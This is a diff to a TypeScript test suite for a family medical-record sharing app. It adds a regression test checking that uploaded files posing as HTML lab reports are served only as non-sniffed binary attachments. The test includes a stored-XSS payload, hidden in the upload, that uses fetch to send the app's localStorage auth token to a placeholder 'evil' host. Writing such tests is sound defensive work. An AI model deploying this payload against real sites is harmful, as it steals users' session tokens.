@@ -54,7 +54,7 @@ async function setup() {
     const text = await res.text()
     let json: any = null
     try { json = JSON.parse(text) } catch { /* 非 JSON */ }
-    return { status: res.status, json, text }
+    return { status: res.status, json, text, headers: res.headers }
   }
   const register = async (username: string, invite?: string) => (await call('POST', '/api/auth/register', undefined, { username, password: 'passw0rd123', ...(invite ? { invite } : {}) })).json
   const op = await register('operator')
@@ -193,6 +193,24 @@ describe('知家分享：范围、访问记录、纳入本院', () => {
     expect(typeof doc.html).toBe('string')
     // 不在分享里的文档 id 一律不存在
     expect((await t.call('GET', `/api/shares/${all.id}/docs/nope`, t.cardio.token)).status).toBe(404)
+  })
+
+  it('家人上传的原件不按自报 MIME 内联：伪装成 HTML 的「化验单」只能作为二进制附件下载', async () => {
+    const t = await setup()
+    const form = new FormData()
+    form.append('file', new File(['<script>fetch("//evil/?"+localStorage["heurion.token"])</script>'], 'lab.html', { type: 'text/html' }))
+    form.append('kind', 'lab_report')
+    const up = (await t.call('POST', `/api/patients/${t.member.id}/files`, t.mom.token, undefined, form)).json
+    await t.call('POST', `/api/patients/${t.member.id}/records/${up.record.id}/confirm`, t.mom.token, {})
+    const s = (await t.share({})).json
+    const f = await t.call('GET', `/api/shares/${s.id}/files/${up.file_id}`, t.cardio.token)
+    expect(f.status).toBe(200)
+    expect(f.headers.get('Content-Type')).toBe('application/octet-stream')
+    expect(f.headers.get('Content-Disposition')).toMatch(/^attachment;/)
+    expect(f.headers.get('X-Content-Type-Options')).toBe('nosniff')
+    // 患者页同样不内联
+    const own = await t.call('GET', `/api/patients/${t.member.id}/files/${up.file_id}`, t.mom.token)
+    expect(own.headers.get('Content-Type')).toBe('application/octet-stream')
   })
 
   it('每次查看 / 下载都记到家人那边该成员的访问日志（医院 · 科室）', async () => {
